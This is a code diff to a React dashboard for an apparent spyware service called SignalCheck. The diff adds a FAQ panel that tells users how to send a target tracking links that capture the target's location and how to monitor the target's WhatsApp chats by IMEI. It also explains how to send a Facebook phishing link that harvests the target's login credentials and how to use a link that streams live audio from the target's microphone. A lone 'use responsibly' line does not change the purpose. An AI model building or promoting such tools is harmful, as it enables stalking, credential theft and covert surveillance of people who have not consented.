@@ -729,8 +729,8 @@ export default function Dashboard({ email }) {
       <Header />
     <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
         <Sidebar
-          active={active || 'Home'}
-          onSelect={label => setActive(label === 'Home' ? null : label)}
+          active={active}
+          onSelect={label => setActive(label)}
           items={sidebarItems}
         />
         <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '2rem 0', maxWidth: '100vw', boxSizing: 'border-box' }}>
@@ -853,6 +853,70 @@ export default function Dashboard({ email }) {
               <h2 style={{ color: '#E1306C', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Instagram</h2>
               <b style={{ marginTop: 16 }}>Instagram coming soon...</b>
           </div>
+          )}
+          {active === 'FAQ' && (
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <img src="/suporte.jpg" alt="Support FAQ" style={{ display: 'block', margin: '0 auto 2rem auto', width: '100%', maxWidth: 320, borderRadius: 12, boxShadow: '0 2px 8px #0005' }} />
+              <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center' }}>Frequently Asked Questions (FAQ)</h2>
+              <div style={{ marginBottom: 32, textAlign: 'left', maxWidth: 700 }}>
+                <h3 style={{ color: '#E60033', marginBottom: 8 }}>How to use each tool:</h3>
+                <b>Lessons</b>
+                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
+                  <li>Access tutorials and instructions for using all features of SignalCheck.</li>
+                  <li>Click on "Lessons" and follow the guides to learn step by step.</li>
+                </ul>
+                <b>Spy Location</b>
+                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
+                  <li>Generate a tracking link and send it to the target device.</li>
+                  <li>When the link is accessed, the device's location will be captured and shown in "Your tracking links".</li>
+                  <li>Click "Refresh list" to update the accesses.</li>
+                </ul>
+                <b>WhatsApp</b>
+                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
+                  <li>Enter the phone number, device model, and IMEI of the target device.</li>
+                  <li>Follow the instructions to connect and monitor WhatsApp conversations.</li>
+                  <li>If you don't have the IMEI, use the help link to learn how to get it or request support.</li>
+                </ul>
+                <b>Facebook Phishing</b>
+                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
+                  <li>Generate a Facebook phishing link and send it to the target.</li>
+                  <li>When the target enters their credentials, the data will be captured and shown in the dashboard.</li>
+                  <li>Use responsibly and only for authorized testing or recovery.</li>
+                </ul>
+                <b>Microphone</b>
+                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
+                  <li>Generate a microphone link and send it to the target device.</li>
+                  <li>When accessed, you can listen to real-time audio from the device's microphone.</li>
+                </ul>
+                <b>IMEI Support</b>
+                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
+                  <li>If you cannot get the IMEI of the target device, open a support ticket via the IMEI Support page.</li>
+                  <li>Provide the phone number, device model/version, and your contact email.</li>
+                  <li>Our team will try to obtain the IMEI for you within 7-10 business days.</li>
+                </ul>
+              </div>
+              <div style={{ color: '#b0b0b0', fontSize: 15, textAlign: 'center', marginTop: 32 }}>
+                If you have more questions, please contact our support team.
+                <br />
+                <button
+                  style={{
+                    marginTop: 24,
+                    background: '#25d366',
+                    color: '#fff',
+                    border: 'none',
+                    borderRadius: 8,
+                    padding: '0.7rem 1.7rem',
+                    fontSize: '1rem',
+                    fontWeight: 700,
+                    cursor: 'pointer',
+                    display: 'inline-block',
+                  }}
+                  onClick={() => window.location.href = 'https://app-perfectpay-combr.vercel.app/'}
+                >
+                  Request a refund
+                </button>
+              </div>
+            </div>
           )}
           {active === 'Support and refund' && (
             <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
